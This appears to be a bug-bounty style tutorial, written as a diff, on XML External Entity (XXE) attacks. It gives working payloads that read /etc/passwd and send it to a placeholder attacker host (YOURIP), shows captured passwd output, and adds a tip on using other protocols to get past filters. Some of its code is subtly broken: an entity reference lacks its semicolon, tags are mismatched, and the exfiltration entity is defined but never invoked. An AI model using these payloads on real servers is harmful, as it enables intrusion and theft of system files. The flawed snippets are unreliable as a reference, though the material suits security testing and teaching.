@@ -1,0 +1,168 @@
+Method 1 - Identifying a vulnerable server by using the SYSTEM entity:
+
+The first step is to see if we are able to use the SYSTEM entity in order to request a local file on the victim machine and/or a remote file on a host of our own.
+
+[code]
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://YOURIP/TEST.ext" >]>
+
+<Prod>
+
+<Prod>
+
+<Type>abc</type>
+
+<name>Bugcrowd</name>
+
+<id>&xxe</id>
+
+</Prod>
+
+</Prod>
+
+[/code]
+
+
+
+
+As shown in the second line of code in the above example, we are requesting FILE.ext on our remote host. Please note that in order to make things nicer and easier, we will use python’s SimpleHTTPServer (python -m SimpleHTTPServer 80). Now if the attack is successful then we will receive the following error on our host:
+
+xx.xx.xxx.xxx - - [20/Feb/2015 23:16:53] code 404, message File not found
+
+xx.xx.xxx.xxx - - [20/Feb/2015 23:16:58] "GET /TEST.ext HTTP/1.1" 404 -
+
+ 
+
+Method 2 - Testing for Document Type Definition (DTD)
+
+For this step, we are going to craft our payload to request a DTD file on our remote host.
+
+Using a DTD makes it easier to manipulate and change our xxe payload.
+
+[code]
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<!DOCTYPE testingxxe [
+
+<!ENTITY % get SYSTEM "file:///etc/passwd">
+
+<!ENTITY % dtd SYSTEM "http://YOURIP:8080/payload.dtd" >
+
+%get %dtd;]>
+
+<Prod>
+
+<Prod>
+
+<Type>abc</type>
+
+<name>Bugcrowd</name>
+
+<id>21</id>
+
+</Prod>
+
+</Prod>
+
+[/code]
+
+
+Inside our payload.dtd file we are going to place the following:
+
+[code]
+
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://YOURIP:8080/?%data;'>">
+
+[/code]
+
+ 
+
+This method allows our remote server to collect the /etc/passwd of the victim server and send it to our ip address at port 8080.
+
+[Example]
+
+$python -m SimpleHTTPServer 8080
+
+[...]
+
+root:x:0:0:root:/root:/bin/bash
+
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+
+bin:x:2:2:bin:/bin:/bin/sh
+
+[...]
+
+[/Example]
+
+or, alternatively, we can use “file://etc” to receive the contents of /etc directory.
+
+PROTIP: You may use gopher:// file:// ftp:// or other attributes for this step to bypass filter restrictions
+
+
+
+Method 3 - XXE via File Upload
+
+Suppose, we have an upload functionality where we are allowed to upload all of our inventory or customers list via an XML formatted file (most web applications provide a stock or default format to be followed by users to make this process easier).
+
+[code]
+
+<?xml version="1.0" encoding="utf-8"?>
+
+<products>
+
+<product id="1" title="Bounty1">
+
+<price>400</price>
+
+</product>
+
+<product id="2" title="Bounty2">
+
+<id>1</id>
+
+<price>250</price>
+
+</product>
+
+</products>
+
+[/code]
+
+We can use our knowledge and tricks from the previous methods to inject our payload into the XML file before it is uploaded onto the application:
+
+[code]
+
+<!DOCTYPE testingxxe [
+
+<!ENTITY % get SYSTEM "file:///etc/passwd">
+
+<!ENTITY % dtd SYSTEM "http://YOURIP:8080/payload.dtd" > %get %dtd;]>
+
+[/code]
+
+Which will give us similar results as “method 2”:
+
+[Example]
+
+$python -m SimpleHTTPServer 8080
+
+[...]
+
+root:x:0:0:root:/root:/bin/bash
+
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+
+bin:x:2:2:bin:/bin:/bin/sh
+
+[...]
+
+[/Example]
+
+
+
